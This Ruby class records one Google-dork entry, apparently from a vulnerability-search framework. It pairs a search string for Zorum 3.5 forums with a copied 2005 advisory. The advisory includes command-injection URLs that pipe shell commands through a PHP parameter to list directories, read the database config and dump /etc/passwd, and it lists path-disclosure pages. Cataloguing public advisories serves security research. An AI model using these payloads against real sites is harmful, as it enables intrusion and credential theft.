module Dorks
   class Dork1072 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1072",
            ghdb_url: "https://www.exploit-db.com/ghdb/1072",
            severity: "6",
            category: "advisories_and_vulnerabilities.rce.zorum-3-5",
            publish_date: "2005-08-18",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by Zorum 3.5"
EDORK
            description: <<~EDESC
Zorum 3.5 remote code execution poc exploitsoftware:description: Zorum is a freely available, open source Web-based forumapplication implemented in PHP. It is available for UNIX, Linux, and any otherplatform that supports PHP script execution.author site: http://zorum.phpoutsourcing.com/1) remote code execution:vulnerable code, in /gorum/prod.php file:07 $doubleApp = isset($argv[1]); ...14 if( $doubleApp )15 {16 $appDir = $argv[1];17 system("mkdir $prodDir/$appDir"); ...a user can execute arbitrary commands using pipe char, example:http://[target]/zorum/gorum/prod.php?argv[1]=|ls%20-lato list directorieshttp://[target]/zorum/gorum/prod.php?argv[1]=|cat%20../config.phpto see database username/password...http://[target]/zorum/gorum/prod.php?argv[1]=|cat%20/etc/passwdto see /etc/passwd file2) path disclosure:http://[target]/zorum/gorum/notification.phphttp://[target]/zorum/user.phphttp://[target]/zorum/attach.phphttp://[target]/zorum/blacklist.phphttp://[target]/zorum/forum.phphttp://[target]/zorum/globalstat.phphttp://[target]/zorum/gorum/trace.phphttp://[target]/zorum/gorum/badwords.phphttp://[target]/zorum/gorum/flood.phpand so on...googledork:"Powered by Zorum 3.5"rgodsite: http://rgod.altervista.orgmail: retrogod at aliceposta itoriginal advisory: http://rgod.altervista.org/zorum.html
EDESC
         })

      end
   end
end
